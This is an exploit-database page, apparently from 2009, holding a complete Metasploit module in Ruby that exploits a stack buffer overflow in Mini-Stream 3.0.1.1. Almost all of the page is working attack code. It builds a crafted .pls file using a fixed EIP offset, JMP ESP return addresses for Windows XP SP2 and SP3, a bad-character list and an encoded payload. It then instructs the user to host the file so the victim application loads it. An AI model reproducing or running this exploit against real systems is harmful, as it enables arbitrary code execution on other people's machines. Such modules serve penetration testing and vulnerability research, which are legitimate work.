Mini-Stream 3.0.1.1 Buffer Overflow Exploit (Meta)
==================================================


# Title: Mini-Stream 3.0.1.1 Buffer Overflow Exploit (Meta)
# CVE-ID: ()
# OSVDB-ID: ()
# Author: Ron Henry and dijital1
# Published: 2009-12-27
# Verified: yes

view source
print?
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039; => &#039;Mini-Stream 3.0.1.1 Buffer Overflow Exploit&#039;,
            &#039;Description&#039; => %q{    
                This module exploits a stack overflow in Mini-Stream 3.0.1.1
            By creating a specially crafted pls file, an an attacker may be able
            to execute arbitrary code.
            },
            &#039;License&#039; => MSF_LICENSE,
            &#039;Author&#039; =>
                [
                    &#039;Corlan Security Team &#039;,
                    &#039;Ron Henry - <rlh [at] ciphermonk.net> - EIP Offset fix&#039;,
                    &#039;dijital1&#039;,
                ],
            &#039;Version&#039; => &#039;$Revision: 7828 $&#039;,
            &#039;References&#039; =>
                [
                    [ &#039;OSVDB&#039;, &#039;&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/10745&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;thread&#039;,
                },
            &#039;Payload&#039; =>
                {
                    &#039;Space&#039; => 3500,
                    &#039;BadChars&#039; => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x26\x3d\x2b\x3f\x3a\x3b\x2d\x2c\x2f\x23\x2e\x5c\x30",
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039; =>
                [
                    [ &#039;Windows XP SP3 - English&#039;, { &#039;Ret&#039; => 0x7e429353} ],      # 0x7e429353 JMP ESP - USER32.dll
                    [ &#039;Windows XP SP2 - English&#039;, { &#039;Ret&#039; => 0x7c941eed} ],      # 0x7c941eed JMP ESP - SHELL32.dll
                ],
            &#039;Privileged&#039; => false,
            &#039;DefaultTarget&#039; => 0))
 
        register_options(
            [
                OptString.new(&#039;FILENAME&#039;, [ false, &#039;The file name.&#039;, &#039;metasploit.pls&#039;]),
            ], self.class)
    end
 
 
    def exploit
 
        sploit = rand_text_alphanumeric(17403)
        sploit << [target.ret].pack(&#039;V&#039;)
        sploit << "CAFE" * 8
        sploit << payload.encoded
 
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
        file_create(sploit)
      print_status("Copy .pls to webserver and pass the URL to the application")
 
    end
 
end



